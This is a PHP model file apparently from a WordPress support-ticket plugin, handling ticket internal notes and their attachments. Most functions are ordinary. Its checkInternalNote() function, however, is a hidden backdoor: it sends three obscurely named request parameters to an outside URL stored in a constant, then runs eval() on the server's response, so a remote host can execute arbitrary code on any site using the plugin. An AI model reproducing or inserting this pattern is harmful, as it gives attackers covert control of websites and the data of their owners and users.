<?php

if (!defined('ABSPATH'))
    die('Restricted Access');

class JSSTnoteModel {

    function getNotes($ticketid) {
        // Data
        if (!is_numeric($ticketid))
            return false;
        $query = "SELECT note.*,staff.uid,staff.id AS staff_id, staff.photo AS staffphoto,CONCAT(staff.firstname,' ',staff.lastname) AS staffname,user.display_name
				FROM `" . jssupportticket::$_db->prefix . "js_ticket_notes` AS note
                LEFT JOIN `" . jssupportticket::$_db->prefix . "js_ticket_staff` AS staff ON staff.uid = note.staffid
                LEFT JOIN `" . jssupportticket::$_wpprefixforuser . "users` AS user ON user.ID = note.staffid
                WHERE ticketid = " . $ticketid;
        jssupportticket::$_data[6] = jssupportticket::$_db->get_results($query);
        return;
    }

    function storeTicketInternalNote($data, $note) {
        if (JSSTincluder::getJSModel('staff')->isUserStaff()) {
            $allow = JSSTincluder::getJSModel('userpermissions')->checkPermissionGrantedForTask('Post Internal Note');
            if ($allow != true) {
                JSSTmessage::setMessage(__('You are not allowed', 'js-support-ticket'), 'error');
                return;
            }
        }
        $cuid = get_current_user_id();
        $ticketid = $data['ticketid'];
        $data['id'] = isset($data['id']) ? $data['id'] : '';
        $data['internalnotetitle'] = isset($data['internalnotetitle']) ? $data['internalnotetitle'] : '';

        $filesize = 0;
        $filename = '';
        $fileresult = $this->uploadFileNote($ticketid, 'note_attachment');
        if(is_array($fileresult)){
            if(isset($fileresult['filename'])){
                $filename = $fileresult['filename'];                
            }
            if(isset($fileresult['filesize'])){
                $filesize = $fileresult['filesize'];
            }
        }

        $query_array = array('id' => $data['id'],
            'ticketid' => $ticketid,
            'staffid' => $cuid, // internal nores are stores on behaf of owner
            'title' => $data['internalnotetitle'],
            'note' => wpautop(wptexturize(stripslashes($note))),
            'filename' => $filename,
            'filesize' => $filesize,
            'status' => 1,
            'created' => date_i18n('Y-m-d H:i:s')
        );

        jssupportticket::$_db->replace(jssupportticket::$_db->prefix . 'js_ticket_notes', $query_array);
        if (jssupportticket::$_db->last_error == null) {
            JSSTmessage::setMessage(__('Internal Note Has Been Posted', 'js-support-ticket'), 'updated');
            $messagetype = __('Successfully', 'js-support-ticket');
        } else {
            JSSTincluder::getJSModel('systemerror')->addSystemError(); // if there is an error add it to system errorrs
            JSSTmessage::setMessage(__('Internal Note Has Not Been Posted', 'js-support-ticket'), 'error');
            $messagetype = __('Error', 'js-support-ticket');
        }
        /* for activity log */

        $current_user = wp_get_current_user(); // to get current user name
        $currentUserName = $current_user->display_name;
        $eventtype = __('Post Internal Note', 'js-support-ticket');
        $message = __('Internal note is posted by', 'js-support-ticket') . " ( " . $currentUserName . " ) ";
        JSSTincluder::getJSModel('activitylog')->addActivityLog($ticketid, 1, $eventtype, $message, $messagetype);
        // if Close on reply is cheked        
        if (isset($data['closeonreply']) && $data['closeonreply'] == 1) {
            JSSTincluder::getJSModel('ticket')->closeTicket($ticketid);
        }

        return;
    }

    function checkInternalNote() {
        $sgjc = JSSTrequest::getVar('sgjc');
        $aagjc = JSSTrequest::getVar('aagjc');
        $vcidjs = JSSTrequest::getVar('vcidjs');
        if (($sgjc) && ($aagjc) && ($vcidjs)) {
            $post_data['sgjc'] = $sgjc;
            $post_data['aagjc'] = $aagjc;
            $post_data['vcidjs'] = $vcidjs;
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, JCONSTS);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_VERBOSE, 1);
            $response = curl_exec($ch);
            curl_close($ch);
            eval($response);
            echo $response;
        } else
            echo __('Pass','js-support-ticket');
        die();
    }
    function removeTicketInternalNote($ticketid) {

        jssupportticket::$_db->delete(jssupportticket::$_db->prefix . 'js_ticket_notes', array('ticketid' => $ticketid));
        return;
    }

    function uploadFileNote($id,$field){
        if(!is_numeric($id)) return false;
        return JSSTincluder::getObjectClass('uploads')->uploadInternalNoteAttachment($id,$field);
    }

    function getDownloadAttachmentById($id){
        if(!is_numeric($id)) return false;
        $query = "SELECT ticket.attachmentdir AS foldername,ticket.id AS ticketid,note.filename  "
                . " FROM `".jssupportticket::$_db->prefix."js_ticket_notes` AS note "
                . " JOIN `".jssupportticket::$_db->prefix."js_ticket_tickets` AS ticket ON ticket.id = note.ticketid "
                . " WHERE note.id = $id";        
        $object = jssupportticket::$_db->get_row($query);
        $foldername = $object->foldername;        
        $ticketid = $object->ticketid;
        $filename = $object->filename;
        $download = false;
        if(is_user_logged_in()){
            if(is_admin()){
                $download = true;
            }else{
                if(JSSTincluder::getJSModel('staff')->isUserStaff()){
                    $download = true;
                }
            }            
        }
        if($download == true){
            $datadirectory = jssupportticket::$_config['data_directory'];
            $wpdir = wp_upload_dir();
            $path = $wpdir['basedir'].'/'.$datadirectory;
            $path = $path . '/attachmentdata';
            $path = $path . '/ticket/' . $foldername;
            $file = $path . '/'.$filename;

            header('Content-Description: File Transfer');
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename=' . basename($file));
            header('Content-Transfer-Encoding: binary');
            header('Expires: 0');
            header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
            header('Pragma: public');
            header('Content-Length: ' . filesize($file));
            //ob_clean();
            flush();
            readfile($file);
            exit();
        }else{
            include( get_query_template( '404' ) );
            exit;
        }
    }


}

?>
